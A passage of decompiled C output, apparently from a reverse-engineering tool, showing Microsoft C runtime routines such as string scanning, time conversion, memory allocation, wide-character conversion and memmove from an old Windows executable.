    FUN_00414d40((undefined *)param_1[0x1b]);
    FUN_00414d40((undefined *)param_1[0x1c]);
    FUN_00414d40((undefined *)param_1[0x1d]);
    FUN_00414d40((undefined *)param_1[0x1e]);
    FUN_00414d40((undefined *)param_1[0x1f]);
    FUN_00414d40((undefined *)param_1[0x20]);
    FUN_00414d40((undefined *)param_1[0x21]);
    FUN_00414d40((undefined *)param_1[0x22]);
    FUN_00414d40((undefined *)param_1[0x23]);
    FUN_00414d40((undefined *)param_1[0x24]);
    FUN_00414d40((undefined *)param_1[0x25]);
    FUN_00414d40((undefined *)param_1[0x26]);
    FUN_00414d40((undefined *)param_1[0x27]);
    FUN_00414d40((undefined *)param_1[0x28]);
    FUN_00414d40((undefined *)param_1[0x29]);
    FUN_00414d40((undefined *)param_1[0x2a]);
  }
  return;
}



/* VA 0041c1c0 */

uint __cdecl FUN_0041c1c0(char *param_1,int param_2)

{
  char *pcVar1;
  char cVar2;
  uint uVar3;
  uint uVar4;
  uint uVar5;
  undefined1 *puVar6;
  char *pcVar7;
  char *pcVar8;
  int local_8;
  int local_4;

  pcVar7 = param_1;
  local_4 = 0;
  local_8 = 0;
  uVar3 = FUN_0041d9c0(0,(LCID)param_1,0x23,(char *)&local_4);
  uVar4 = FUN_0041d9c0(0,(LCID)pcVar7,0x25,(char *)&local_8);
  uVar5 = FUN_0041d9c0(1,(LCID)pcVar7,0x1e,(char *)&param_1);
  uVar5 = uVar3 | uVar4 | uVar5;
  if (uVar5 != 0) {
    return uVar5;
  }
  puVar6 = (undefined1 *)FUN_00414db0(0xd);
  *(undefined1 **)(param_2 + 0xa8) = puVar6;
  if (local_4 == 0) {
    *puVar6 = 0x68;
    pcVar7 = puVar6 + 1;
    if (local_8 == 0) goto LAB_0041c25c;
    *pcVar7 = 'h';
  }
  else {
    *puVar6 = 0x48;
    pcVar7 = puVar6 + 1;
    if (local_8 == 0) goto LAB_0041c25c;
    *pcVar7 = 'H';
  }
  pcVar7 = puVar6 + 2;
LAB_0041c25c:
  cVar2 = *param_1;
  pcVar8 = param_1;
  while (cVar2 != '\0') {
    *pcVar7 = cVar2;
    pcVar1 = pcVar8 + 1;
    pcVar7 = pcVar7 + 1;
    pcVar8 = pcVar8 + 1;
    cVar2 = *pcVar1;
  }
  *pcVar7 = 'm';
  pcVar8 = pcVar7 + 1;
  if (local_8 != 0) {
    *pcVar8 = 'm';
    pcVar8 = pcVar7 + 2;
  }
  cVar2 = *param_1;
  pcVar7 = param_1;
  while (cVar2 != '\0') {
    *pcVar8 = cVar2;
    pcVar1 = pcVar7 + 1;
    pcVar8 = pcVar8 + 1;
    pcVar7 = pcVar7 + 1;
    cVar2 = *pcVar1;
  }
  *pcVar8 = 's';
  pcVar8[1] = 's';
  pcVar8[2] = '\0';
  FUN_00414d40(param_1);
  return 0;
}



/* VA 0041c4c0 */

void __cdecl FUN_0041c4c0(char *param_1)

{
  char *pcVar1;
  char cVar2;
  char *pcVar3;

  cVar2 = *param_1;
  do {
    if (cVar2 == '\0') {
      return;
    }
    if ((cVar2 < '0') || ('9' < cVar2)) {
      pcVar3 = param_1;
      if (cVar2 != ';') goto LAB_0041c4d6;
      do {
        *pcVar3 = pcVar3[1];
        pcVar1 = pcVar3 + 1;
        pcVar3 = pcVar3 + 1;
      } while (*pcVar1 != '\0');
    }
    else {
      *param_1 = cVar2 + -0x30;
LAB_0041c4d6:
      param_1 = param_1 + 1;
    }
    cVar2 = *param_1;
  } while( true );
}



/* VA 0041c5f0 */

uint __cdecl FUN_0041c5f0(int param_1)

{
  uint uVar1;
  uint uVar2;
  uint uVar3;
  uint uVar4;
  uint uVar5;
  uint uVar6;
  uint uVar7;
  uint uVar8;
  uint uVar9;
  uint uVar10;
  uint uVar11;
  uint uVar12;
  uint uVar13;
  uint uVar14;
  uint uVar15;

  uVar15 = (uint)DAT_0042f0cc;
  if (param_1 == 0) {
    return 0xffffffff;
  }
  uVar1 = FUN_0041d9c0(1,uVar15,0x15,(char *)(param_1 + 0xc));
  uVar2 = FUN_0041d9c0(1,uVar15,0x14,(char *)(param_1 + 0x10));
  uVar3 = FUN_0041d9c0(1,uVar15,0x16,(char *)(param_1 + 0x14));
  uVar4 = FUN_0041d9c0(1,uVar15,0x17,(char *)(param_1 + 0x18));
  uVar5 = FUN_0041d9c0(1,uVar15,0x18,(char *)(param_1 + 0x1c));
  FUN_0041c4c0(*(char **)(param_1 + 0x1c));
  uVar6 = FUN_0041d9c0(1,uVar15,0x50,(char *)(param_1 + 0x20));
  uVar7 = FUN_0041d9c0(1,uVar15,0x51,(char *)(param_1 + 0x24));
  uVar8 = FUN_0041d9c0(0,uVar15,0x1a,(char *)(param_1 + 0x28));
  uVar9 = FUN_0041d9c0(0,uVar15,0x19,(char *)(param_1 + 0x29));
  uVar10 = FUN_0041d9c0(0,uVar15,0x54,(char *)(param_1 + 0x2a));
  uVar11 = FUN_0041d9c0(0,uVar15,0x55,(char *)(param_1 + 0x2b));
  uVar12 = FUN_0041d9c0(0,uVar15,0x56,(char *)(param_1 + 0x2c));
  uVar13 = FUN_0041d9c0(0,uVar15,0x57,(char *)(param_1 + 0x2d));
  uVar14 = FUN_0041d9c0(0,uVar15,0x52,(char *)(param_1 + 0x2e));
  uVar15 = FUN_0041d9c0(0,uVar15,0x53,(char *)(param_1 + 0x2f));
  return uVar1 | uVar2 | uVar3 | uVar4 | uVar5 | uVar6 | uVar7 | uVar8 | uVar9 | uVar10 | uVar11 |
         uVar12 | uVar13 | uVar14 | uVar15;
}



/* VA 0041c740 */

void __cdecl FUN_0041c740(int param_1)

{
  if ((param_1 != 0) && (*(undefined **)(param_1 + 0xc) != &DAT_0042f100)) {
    FUN_00414d40(*(undefined **)(param_1 + 0xc));
    FUN_00414d40(*(undefined **)(param_1 + 0x10));
    FUN_00414d40(*(undefined **)(param_1 + 0x14));
    FUN_00414d40(*(undefined **)(param_1 + 0x18));
    FUN_00414d40(*(undefined **)(param_1 + 0x1c));
    FUN_00414d40(*(undefined **)(param_1 + 0x20));
    FUN_00414d40(*(undefined **)(param_1 + 0x24));
  }
  return;
}



/* VA 0041ca70 */

/* Library Function - Single Match
    _strcspn

   Libraries: Visual Studio 1998 Debug, Visual Studio 1998 Release */

size_t __cdecl _strcspn(char *_Str,char *_Control)

{
  byte bVar1;
  size_t sVar2;
  byte abStack_28 [32];

  abStack_28[0x1c] = 0;
  abStack_28[0x1d] = 0;
  abStack_28[0x1e] = 0;
  abStack_28[0x1f] = 0;
  abStack_28[0x18] = 0;
  abStack_28[0x19] = 0;
  abStack_28[0x1a] = 0;
  abStack_28[0x1b] = 0;
  abStack_28[0x14] = 0;
  abStack_28[0x15] = 0;
  abStack_28[0x16] = 0;
  abStack_28[0x17] = 0;
  abStack_28[0x10] = 0;
  abStack_28[0x11] = 0;
  abStack_28[0x12] = 0;
  abStack_28[0x13] = 0;
  abStack_28[0xc] = 0;
  abStack_28[0xd] = 0;
  abStack_28[0xe] = 0;
  abStack_28[0xf] = 0;
  abStack_28[8] = 0;
  abStack_28[9] = 0;
  abStack_28[10] = 0;
  abStack_28[0xb] = 0;
  abStack_28[4] = 0;
  abStack_28[5] = 0;
  abStack_28[6] = 0;
  abStack_28[7] = 0;
  abStack_28[0] = 0;
  abStack_28[1] = 0;
  abStack_28[2] = 0;
  abStack_28[3] = 0;
  while( true ) {
    bVar1 = *_Control;
    if (bVar1 == 0) break;
    _Control = _Control + 1;
    abStack_28[(int)(uint)bVar1 >> 3] = abStack_28[(int)(uint)bVar1 >> 3] | '\x01' << (bVar1 & 7);
  }
  sVar2 = 0xffffffff;
  do {
    sVar2 = sVar2 + 1;
    bVar1 = *_Str;
    if (bVar1 == 0) {
      return sVar2;
    }
    _Str = _Str + 1;
  } while ((abStack_28[(int)(uint)bVar1 >> 3] >> (bVar1 & 7) & 1) == 0);
  return sVar2;
}



/* VA 0041cab0 */

/* Library Function - Single Match
    _strpbrk

   Libraries: Visual Studio 1998 Debug, Visual Studio 1998 Release */

char * __cdecl _strpbrk(char *_Str,char *_Control)

{
  byte bVar1;
  byte *pbVar2;
  byte abStack_28 [32];

  abStack_28[0x1c] = 0;
  abStack_28[0x1d] = 0;
  abStack_28[0x1e] = 0;
  abStack_28[0x1f] = 0;
  abStack_28[0x18] = 0;
  abStack_28[0x19] = 0;
  abStack_28[0x1a] = 0;
  abStack_28[0x1b] = 0;
  abStack_28[0x14] = 0;
  abStack_28[0x15] = 0;
  abStack_28[0x16] = 0;
  abStack_28[0x17] = 0;
  abStack_28[0x10] = 0;
  abStack_28[0x11] = 0;
  abStack_28[0x12] = 0;
  abStack_28[0x13] = 0;
  abStack_28[0xc] = 0;
  abStack_28[0xd] = 0;
  abStack_28[0xe] = 0;
  abStack_28[0xf] = 0;
  abStack_28[8] = 0;
  abStack_28[9] = 0;
  abStack_28[10] = 0;
  abStack_28[0xb] = 0;
  abStack_28[4] = 0;
  abStack_28[5] = 0;
  abStack_28[6] = 0;
  abStack_28[7] = 0;
  abStack_28[0] = 0;
  abStack_28[1] = 0;
  abStack_28[2] = 0;
  abStack_28[3] = 0;
  while( true ) {
    bVar1 = *_Control;
    if (bVar1 == 0) break;
    _Control = _Control + 1;
    abStack_28[(int)(uint)bVar1 >> 3] = abStack_28[(int)(uint)bVar1 >> 3] | '\x01' << (bVar1 & 7);
  }
  do {
    pbVar2 = (byte *)_Str;
    bVar1 = *pbVar2;
    if (bVar1 == 0) {
      return (char *)0x0;
    }
    _Str = (char *)(pbVar2 + 1);
  } while ((abStack_28[(int)(uint)bVar1 >> 3] >> (bVar1 & 7) & 1) == 0);
  return (char *)pbVar2;
}



/* VA 0041caf0 */

void __cdecl FUN_0041caf0(int *param_1)

{
  int iVar1;

  DAT_0042ed6c = DAT_0042ed6c + 1;
  iVar1 = FUN_00414db0(0x1000);
  param_1[2] = iVar1;
  if (iVar1 != 0) {
    param_1[3] = param_1[3] | 8;
    param_1[6] = 0x1000;
    *param_1 = param_1[2];
    param_1[1] = 0;
    return;
  }
  param_1[6] = 2;
  param_1[3] = param_1[3] | 4;
  param_1[2] = (int)(param_1 + 5);
  *param_1 = (int)(param_1 + 5);
  param_1[1] = 0;
  return;
}



/* VA 0041cb50 */

byte __cdecl FUN_0041cb50(uint param_1)

{
  if (DAT_00430380 <= param_1) {
    return 0;
  }
  return *(byte *)((&DAT_00430280)[(int)param_1 >> 5] + 4 + (param_1 & 0x1f) * 0x24) & 0x40;
}



/* VA 0041cb80 */

int __cdecl FUN_0041cb80(LPSTR param_1,WCHAR param_2)

{
  int iVar1;
  bool bVar2;

  InterlockedIncrement((LONG *)&DAT_004313a8);
  bVar2 = DAT_004313a4 != 0;
  if (bVar2) {
    InterlockedDecrement((LONG *)&DAT_004313a8);
    FUN_00417120(0x13);
  }
  iVar1 = FUN_0041cbf0(param_1,param_2);
  if (!bVar2) {
    InterlockedDecrement((LONG *)&DAT_004313a8);
    return iVar1;
  }
  FUN_004171a0(0x13);
  return iVar1;
}



/* VA 0041cbf0 */

int __cdecl FUN_0041cbf0(LPSTR param_1,WCHAR param_2)

{
  LPSTR lpMultiByteStr;
  int iVar1;
  DWORD *pDVar2;

  lpMultiByteStr = param_1;
  if (param_1 == (LPSTR)0x0) {
    return 0;
  }
  if (DAT_0042ed50 == 0) {
    if ((ushort)param_2 < 0x100) {
      *param_1 = (CHAR)param_2;
      return 1;
    }
  }
  else {
    param_1 = (LPSTR)0x0;
    iVar1 = WideCharToMultiByte(DAT_0042ed60,0x220,&param_2,1,lpMultiByteStr,DAT_0042adcc,
                                (LPCSTR)0x0,(LPBOOL)&param_1);
    if ((iVar1 != 0) && (param_1 == (LPSTR)0x0)) {
      return iVar1;
    }
  }
  pDVar2 = FUN_00419020();
  *pDVar2 = 0x2a;
  return -1;
}



/* VA 0041cc70 */

undefined8 FUN_0041cc70(uint param_1,uint param_2,uint param_3,uint param_4)

{
  ulonglong uVar1;
  longlong lVar2;
  uint uVar3;
  int iVar4;
  uint uVar5;
  uint uVar7;
  uint uVar8;
  uint uVar9;
  uint uVar6;

  uVar9 = param_1;
  uVar6 = param_4;
  uVar7 = param_2;
  uVar3 = param_3;
  if (param_4 == 0) {
    uVar3 = param_2 / param_3;
    iVar4 = (int)(((ulonglong)param_2 % (ulonglong)param_3 << 0x20 | (ulonglong)param_1) /
                 (ulonglong)param_3);
  }
  else {
    do {
      uVar5 = uVar6 >> 1;
      uVar3 = (uint)(CONCAT14((uVar6 & 1) != 0,uVar3) >> 1);
      uVar8 = uVar7 >> 1;
      uVar9 = (uint)(CONCAT14((uVar7 & 1) != 0,uVar9) >> 1);
      uVar6 = uVar5;
      uVar7 = uVar8;
    } while (uVar5 != 0);
    uVar1 = CONCAT44(uVar8,uVar9) / (ulonglong)uVar3;
    iVar4 = (int)uVar1;
    lVar2 = (ulonglong)param_3 * (uVar1 & 0xffffffff);
    uVar3 = (uint)((ulonglong)lVar2 >> 0x20);
    uVar9 = uVar3 + iVar4 * param_4;
    if (((CARRY4(uVar3,iVar4 * param_4)) || (param_2 < uVar9)) ||
       ((param_2 <= uVar9 && (param_1 < (uint)lVar2)))) {
      iVar4 = iVar4 + -1;
    }
    uVar3 = 0;
  }
  return CONCAT44(uVar3,iVar4);
}



/* VA 0041cce0 */

undefined8 FUN_0041cce0(uint param_1,uint param_2,uint param_3,uint param_4)

{
  ulonglong uVar1;
  longlong lVar2;
  uint uVar3;
  uint uVar4;
  uint uVar5;
  int iVar6;
  int iVar7;
  uint uVar8;
  uint uVar9;
  uint uVar10;
  bool bVar11;

  uVar4 = param_1;
  uVar9 = param_4;
  uVar10 = param_2;
  uVar3 = param_3;
  if (param_4 == 0) {
    iVar6 = (int)(((ulonglong)param_2 % (ulonglong)param_3 << 0x20 | (ulonglong)param_1) %
                 (ulonglong)param_3);
    iVar7 = 0;
  }
  else {
    do {
      uVar5 = uVar9 >> 1;
      uVar3 = (uint)(CONCAT14((uVar9 & 1) != 0,uVar3) >> 1);
      uVar8 = uVar10 >> 1;
      uVar4 = (uint)(CONCAT14((uVar10 & 1) != 0,uVar4) >> 1);
      uVar9 = uVar5;
      uVar10 = uVar8;
    } while (uVar5 != 0);
    uVar1 = CONCAT44(uVar8,uVar4) / (ulonglong)uVar3;
    uVar3 = (int)uVar1 * param_4;
    lVar2 = (uVar1 & 0xffffffff) * (ulonglong)param_3;
    uVar9 = (uint)((ulonglong)lVar2 >> 0x20);
    uVar4 = (uint)lVar2;
    uVar10 = uVar9 + uVar3;
    if (((CARRY4(uVar9,uVar3)) || (param_2 < uVar10)) || ((param_2 <= uVar10 && (param_1 < uVar4))))
    {
      bVar11 = uVar4 < param_3;
      uVar4 = uVar4 - param_3;
      uVar10 = (uVar10 - param_4) - (uint)bVar11;
    }
    iVar6 = -(uVar4 - param_1);
    iVar7 = -(uint)(uVar4 - param_1 != 0) - ((uVar10 - param_2) - (uint)(uVar4 < param_1));
  }
  return CONCAT44(iVar7,iVar6);
}



/* VA 0041cd70 */

int __cdecl FUN_0041cd70(int *param_1,int param_2)

{
  int iVar1;
  tm *ptVar2;
  uint uVar3;
  int iVar4;
  int iVar5;
  int *piVar6;

  piVar6 = param_1;
  uVar3 = param_1[5];
  if ((int)uVar3 < 0x45) {
    return -1;
  }
  if (0x8b < (int)uVar3) {
    return -1;
  }
  iVar4 = param_1[4];
  if ((iVar4 < 0) || (0xb < iVar4)) {
    uVar3 = uVar3 + iVar4 / 0xc;
    iVar4 = iVar4 % 0xc;
    param_1[4] = iVar4;
    if (iVar4 < 0) {
      uVar3 = uVar3 - 1;
      param_1[4] = iVar4 + 0xc;
    }
    if ((int)uVar3 < 0x45) {
      return -1;
    }
    if (0x8b < (int)uVar3) {
      return -1;
    }
  }
  iVar4 = (&DAT_0042df88)[param_1[4]];
  if (((uVar3 & 3) == 0) && (1 < param_1[4])) {
    iVar4 = iVar4 + 1;
  }
  iVar1 = param_1[3];
  iVar5 = uVar3 * 0x16d + -0x63df + iVar4 + ((int)(uVar3 - 1) >> 2);
  iVar4 = iVar5 + iVar1;
  if (iVar5 < 0) {
LAB_0041ce20:
    if ((iVar1 < 0) && (-1 < iVar4)) {
      return -1;
    }
  }
  else {
    if ((-1 < iVar1) && (iVar4 < 0)) {
      return -1;
    }
    if (iVar5 < 0) goto LAB_0041ce20;
  }
  iVar5 = iVar4 * 0x18;
  if (iVar4 != 0 && iVar5 / iVar4 != 0x18) {
    return -1;
  }
  iVar1 = param_1[2];
  iVar4 = iVar1 + iVar5;
  if (iVar5 < 0) {
LAB_0041ce6b:
    if ((iVar1 < 0) && (-1 < iVar4)) {
      return -1;
    }
  }
  else {
    if ((-1 < iVar1) && (iVar4 < 0)) {
      return -1;
    }
    if (iVar5 < 0) goto LAB_0041ce6b;
  }
  iVar5 = iVar4 * 0x3c;
  if (iVar4 != 0 && iVar5 / iVar4 != 0x3c) {
    return -1;
  }
  iVar1 = param_1[1];
  iVar4 = iVar1 + iVar5;
  if (iVar5 < 0) {
LAB_0041ceba:
    if ((iVar1 < 0) && (-1 < iVar4)) {
      return -1;
    }
  }
  else {
    if ((-1 < iVar1) && (iVar4 < 0)) {
      return -1;
    }
    if (iVar5 < 0) goto LAB_0041ceba;
  }
  iVar5 = iVar4 * 0x3c;
  if (iVar4 != 0 && iVar5 / iVar4 != 0x3c) {
    return -1;
  }
  iVar4 = *param_1;
  param_1 = (int *)(iVar4 + iVar5);
  if (-1 < iVar5) {
    if ((-1 < iVar4) && ((int)param_1 < 0)) {
      return -1;
    }
    if (-1 < iVar5) goto LAB_0041cf18;
  }
  if ((iVar4 < 0) && (-1 < (int)param_1)) {
    return -1;
  }
LAB_0041cf18:
  if (param_2 == 0) {
    ptVar2 = (tm *)FUN_00419d10((int *)&param_1);
    if (ptVar2 == (tm *)0x0) {
      return -1;
    }
  }
  else {
    FUN_004195b0();
    param_1 = (int *)((int)param_1 + DAT_0042d440);
    ptVar2 = FUN_00415d70((int *)&param_1);
    if (ptVar2 == (tm *)0x0) {
      return -1;
    }
    if ((0 < piVar6[8]) || ((piVar6[8] < 0 && (0 < ptVar2->tm_isdst)))) {
      param_1 = (int *)((int)param_1 + DAT_0042d448);
      ptVar2 = FUN_00415d70((int *)&param_1);
      for (iVar4 = 9; iVar4 != 0; iVar4 = iVar4 + -1) {
        *piVar6 = ptVar2->tm_sec;
        ptVar2 = (tm *)&ptVar2->tm_min;
        piVar6 = piVar6 + 1;
      }
      return (int)param_1;
    }
  }
  for (iVar4 = 9; iVar4 != 0; iVar4 = iVar4 + -1) {
    *piVar6 = ptVar2->tm_sec;
    ptVar2 = (tm *)&ptVar2->tm_min;
    piVar6 = piVar6 + 1;
  }
  return (int)param_1;
}



/* VA 0041d0f0 */

int * __cdecl FUN_0041d0f0(int param_1,int param_2)

{
  int iVar1;
  uint uVar2;
  uint dwBytes;
  int *piVar3;
  int *piVar4;

  dwBytes = param_2 * param_1;
  if (dwBytes < 0xffffffe1) {
    if (dwBytes == 0) {
      dwBytes = 0x10;
    }
    else {
      dwBytes = dwBytes + 0xf & 0xfffffff0;
    }
  }
  do {
    piVar3 = (int *)0x0;
    if (dwBytes < 0xffffffe1) {
      if (DAT_0042ceec < dwBytes) {
LAB_0041d164:
        if (piVar3 != (int *)0x0) {
          return piVar3;
        }
      }
      else {
        FUN_00417120(9);
        piVar3 = FUN_00417600(dwBytes >> 4);
        FUN_004171a0(9);
        if (piVar3 != (int *)0x0) {
          piVar4 = piVar3;
          for (uVar2 = dwBytes >> 2; uVar2 != 0; uVar2 = uVar2 - 1) {
            *piVar4 = 0;
            piVar4 = piVar4 + 1;
          }
          for (uVar2 = dwBytes & 3; uVar2 != 0; uVar2 = uVar2 - 1) {
            *(undefined1 *)piVar4 = 0;
            piVar4 = (int *)((int)piVar4 + 1);
          }
          goto LAB_0041d164;
        }
      }
      piVar3 = HeapAlloc(DAT_004313ac,8,dwBytes);
    }
    if ((piVar3 != (int *)0x0) || (DAT_0042ed34 == 0)) {
      return piVar3;
    }
    iVar1 = FUN_00417a90(dwBytes);
    if (iVar1 == 0) {
      return (int *)0x0;
    }
  } while( true );
}



/* VA 0041d240 */

uint __cdecl FUN_0041d240(LPSTR param_1,LPCWSTR param_2,uint param_3)

{
  uint uVar1;
  bool bVar2;

  InterlockedIncrement((LONG *)&DAT_004313a8);
  bVar2 = DAT_004313a4 != 0;
  if (bVar2) {
    InterlockedDecrement((LONG *)&DAT_004313a8);
    FUN_00417120(0x13);
  }
  uVar1 = FUN_0041d2c0(param_1,param_2,param_3);
  if (!bVar2) {
    InterlockedDecrement((LONG *)&DAT_004313a8);
    return uVar1;
  }
  FUN_004171a0(0x13);
  return uVar1;
}



/* VA 0041d2c0 */

uint __cdecl FUN_0041d2c0(LPSTR param_1,LPCWSTR param_2,uint param_3)

{
  char cVar1;
  uint uVar2;
  int iVar3;
  uint uVar4;
  DWORD DVar5;
  DWORD *pDVar6;
  LPCWSTR pWVar7;
  int iVar8;
  BOOL local_4;

  uVar4 = param_3;
  pWVar7 = param_2;
  uVar2 = 0;
  local_4 = 0;
  if ((param_1 != (LPSTR)0x0) && (param_3 == 0)) {
    return uVar2;
  }
  if (param_1 == (LPSTR)0x0) {
    if (DAT_0042ed50 == 0) {
      uVar4 = FUN_004162e0(param_2);
      return uVar4;
    }
    iVar3 = WideCharToMultiByte(DAT_0042ed60,0x220,param_2,-1,(LPSTR)0x0,0,(LPCSTR)0x0,&local_4);
    if ((iVar3 != 0) && (local_4 == 0)) {
      return iVar3 - 1;
    }
  }
  else if (DAT_0042ed50 == 0) {
    if (param_3 == 0) {
      return 0;
    }
    while ((ushort)*pWVar7 < 0x100) {
      param_1[uVar2] = (CHAR)*pWVar7;
      if (*pWVar7 == L'\0') {
        return uVar2;
      }
      uVar2 = uVar2 + 1;
      pWVar7 = pWVar7 + 1;
      if (param_3 <= uVar2) {
        return uVar2;
      }
    }
  }
  else if (DAT_0042adcc == 1) {
    iVar3 = 0;
    if (param_3 != 0) {
      iVar3 = FUN_0041d4b0(param_2,param_3);
    }
    uVar4 = WideCharToMultiByte(DAT_0042ed60,0x220,pWVar7,iVar3,param_1,iVar3,(LPCSTR)0x0,&local_4);
    if ((uVar4 != 0) && (local_4 == 0)) {
      if (param_1[uVar4 - 1] != '\0') {
        return uVar4;
      }
      return uVar4 - 1;
    }
  }
  else {
    iVar3 = WideCharToMultiByte(DAT_0042ed60,0x220,param_2,-1,param_1,param_3,(LPCSTR)0x0,&local_4);
    if (iVar3 == 0) {
      if ((local_4 == 0) && (DVar5 = GetLastError(), DVar5 == 0x7a)) {
        uVar2 = 0;
        if (uVar4 != 0) {
          do {
            iVar3 = WideCharToMultiByte(DAT_0042ed60,0,pWVar7,1,(LPSTR)&param_2,DAT_0042adcc,
                                        (LPCSTR)0x0,&local_4);
            if ((iVar3 == 0) || (local_4 != 0)) goto LAB_0041d496;
            if (uVar4 < iVar3 + uVar2) {
              return uVar2;
            }
            iVar8 = 0;
            if (0 < iVar3) {
              do {
                cVar1 = *(char *)((int)&param_2 + iVar8);
                param_1[uVar2] = cVar1;
                if (cVar1 == '\0') {
                  return uVar2;
                }
                iVar8 = iVar8 + 1;
                uVar2 = uVar2 + 1;
              } while (iVar8 < iVar3);
            }
            pWVar7 = pWVar7 + 1;
          } while (uVar2 < uVar4);
        }
        return uVar2;
      }
    }
    else if (local_4 == 0) {
      return iVar3 - 1;
    }
  }
LAB_0041d496:
  pDVar6 = FUN_00419020();
  *pDVar6 = 0x2a;
  return 0xffffffff;
}



/* VA 0041d4b0 */

int __cdecl FUN_0041d4b0(short *param_1,int param_2)

{
  short *psVar1;
  int iVar2;

  psVar1 = param_1;
  iVar2 = param_2;
  if (param_2 != 0) {
    do {
      if (*psVar1 == 0) break;
      psVar1 = psVar1 + 1;
      iVar2 = iVar2 + -1;
    } while (iVar2 != 0);
    if ((iVar2 != 0) && (*psVar1 == 0)) {
      return ((int)psVar1 - (int)param_1 >> 1) + 1;
    }
  }
  return param_2;
}



/* VA 0041d4f0 */

int __cdecl FUN_0041d4f0(byte *param_1)

{
  byte bVar1;
  int iVar2;
  uint uVar3;
  LPWSTR pWVar4;
  byte *pbVar5;
  int *piVar6;
  byte *pbVar7;

  if (((DAT_0042ec80 != (int *)0x0) ||
      (((DAT_0042ec88 == 0 || (iVar2 = FUN_0041df00(), iVar2 == 0)) && (DAT_0042ec80 != (int *)0x0))
      )) && (param_1 != (byte *)0x0)) {
    uVar3 = 0xffffffff;
    pbVar5 = (byte *)*DAT_0042ec80;
    pbVar7 = param_1;
    do {
      if (uVar3 == 0) break;
      uVar3 = uVar3 - 1;
      bVar1 = *pbVar7;
      pbVar7 = pbVar7 + 1;
    } while (bVar1 != 0);
    pWVar4 = (LPWSTR)(~uVar3 - 1);
    piVar6 = DAT_0042ec80;
    if (pbVar5 != (byte *)0x0) {
      do {
        uVar3 = 0xffffffff;
        pbVar7 = pbVar5;
        do {
          if (uVar3 == 0) break;
          uVar3 = uVar3 - 1;
          bVar1 = *pbVar7;
          pbVar7 = pbVar7 + 1;
        } while (bVar1 != 0);
        if (((pWVar4 < (LPWSTR)(~uVar3 - 1)) && (*(byte *)((int)pWVar4 + (int)pbVar5) == 0x3d)) &&
           (iVar2 = FUN_0041dec0(pbVar5,param_1,pWVar4), iVar2 == 0)) {
          return *piVar6 + 1 + (int)pWVar4;
        }
        pbVar5 = (byte *)piVar6[1];
        piVar6 = piVar6 + 1;
        if (pbVar5 == (byte *)0x0) {
          return 0;
        }
      } while( true );
    }
  }
  return 0;
}



/* VA 0041d580 */

undefined4 * __cdecl FUN_0041d580(undefined4 *param_1,undefined4 *param_2,uint param_3)

{
  uint uVar1;
  uint uVar2;
  undefined4 *puVar3;
  undefined4 *puVar4;

  if ((param_2 < param_1) && (param_1 < (undefined4 *)(param_3 + (int)param_2))) {
    puVar3 = (undefined4 *)((param_3 - 4) + (int)param_2);
    puVar4 = (undefined4 *)((param_3 - 4) + (int)param_1);
    if (((uint)puVar4 & 3) == 0) {
      uVar1 = param_3 >> 2;
      uVar2 = param_3 & 3;
      if (7 < uVar1) {
        for (; uVar1 != 0; uVar1 = uVar1 - 1) {
          *puVar4 = *puVar3;
          puVar3 = puVar3 + -1;
          puVar4 = puVar4 + -1;
        }
        switch(uVar2) {
        case 0:
          return param_1;
        case 2:
          goto switchD_0041d737_caseD_2;
        case 3:
          goto switchD_0041d737_caseD_3;
        }
        goto switchD_0041d737_caseD_1;
      }
    }
    else {
      switch(param_3) {
      case 0:
        goto switchD_0041d737_caseD_0;
      case 1:
        goto switchD_0041d737_caseD_1;
      case 2:
        goto switchD_0041d737_caseD_2;
      case 3:
        goto switchD_0041d737_caseD_3;
      default:
        uVar1 = param_3 - ((uint)puVar4 & 3);
        switch((uint)puVar4 & 3) {
        case 1:
          uVar2 = uVar1 & 3;
          *(undefined1 *)((int)puVar4 + 3) = *(undefined1 *)((int)puVar3 + 3);
          puVar3 = (undefined4 *)((int)puVar3 + -1);
          uVar1 = uVar1 >> 2;
          puVar4 = (undefined4 *)((int)puVar4 - 1);
          if (7 < uVar1) {
            for (; uVar1 != 0; uVar1 = uVar1 - 1) {
              *puVar4 = *puVar3;
              puVar3 = puVar3 + -1;
              puVar4 = puVar4 + -1;
            }
            switch(uVar2) {
            case 0:
              return param_1;
            case 2:
              goto switchD_0041d737_caseD_2;
            case 3:
              goto switchD_0041d737_caseD_3;
            }
            goto switchD_0041d737_caseD_1;
          }
          break;
        case 2:
          uVar2 = uVar1 & 3;
          *(undefined1 *)((int)puVar4 + 3) = *(undefined1 *)((int)puVar3 + 3);
          uVar1 = uVar1 >> 2;
          *(undefined1 *)((int)puVar4 + 2) = *(undefined1 *)((int)puVar3 + 2);
          puVar3 = (undefined4 *)((int)puVar3 + -2);
          puVar4 = (undefined4 *)((int)puVar4 - 2);
          if (7 < uVar1) {
            for (; uVar1 != 0; uVar1 = uVar1 - 1) {
              *puVar4 = *puVar3;
              puVar3 = puVar3 + -1;
              puVar4 = puVar4 + -1;
            }
            switch(uVar2) {
            case 0:
              return param_1;
            case 2:
              goto switchD_0041d737_caseD_2;
            case 3:
              goto switchD_0041d737_caseD_3;
            }
            goto switchD_0041d737_caseD_1;
          }
          break;
        case 3:
          uVar2 = uVar1 & 3;
          *(undefined1 *)((int)puVar4 + 3) = *(undefined1 *)((int)puVar3 + 3);
          *(undefined1 *)((int)puVar4 + 2) = *(undefined1 *)((int)puVar3 + 2);
          uVar1 = uVar1 >> 2;
          *(undefined1 *)((int)puVar4 + 1) = *(undefined1 *)((int)puVar3 + 1);
          puVar3 = (undefined4 *)((int)puVar3 + -3);
          puVar4 = (undefined4 *)((int)puVar4 - 3);
          if (7 < uVar1) {
            for (; uVar1 != 0; uVar1 = uVar1 - 1) {
              *puVar4 = *puVar3;
              puVar3 = puVar3 + -1;
              puVar4 = puVar4 + -1;
            }
            switch(uVar2) {
            case 0:
              return param_1;
            case 2:
              goto switchD_0041d737_caseD_2;
            case 3:
              goto switchD_0041d737_caseD_3;
            }
            goto switchD_0041d737_caseD_1;
          }
        }
      }
    }
    switch(uVar1) {
    case 7:
      puVar4[7 - uVar1] = puVar3[7 - uVar1];
    case 6:
      puVar4[6 - uVar1] = puVar3[6 - uVar1];
    case 5:
      puVar4[5 - uVar1] = puVar3[5 - uVar1];
    case 4:
      puVar4[4 - uVar1] = puVar3[4 - uVar1];
    case 3:
      puVar4[3 - uVar1] = puVar3[3 - uVar1];
    case 2:
      puVar4[2 - uVar1] = puVar3[2 - uVar1];
    case 1:
      puVar4[1 - uVar1] = puVar3[1 - uVar1];
      puVar3 = puVar3 + -uVar1;
      puVar4 = puVar4 + -uVar1;
    }
    switch(uVar2) {
    case 1:
